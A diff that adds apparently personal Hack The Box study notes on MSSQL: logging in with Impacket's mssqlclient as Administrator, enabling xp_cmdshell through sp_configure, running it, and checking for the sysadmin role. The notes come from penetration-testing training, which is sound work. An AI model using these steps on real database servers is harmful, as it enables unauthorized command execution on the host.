@@ -26,3 +26,22 @@ Impacket's mssqlclient.py
 ```shell-session
 u@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 ```
+shell:
+```
+EXEC xp_cmdshell
+```
+enable shell:
+```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+
+check role:
+```
+SELECT is_srvrolemember('sysadmin');
+```
+
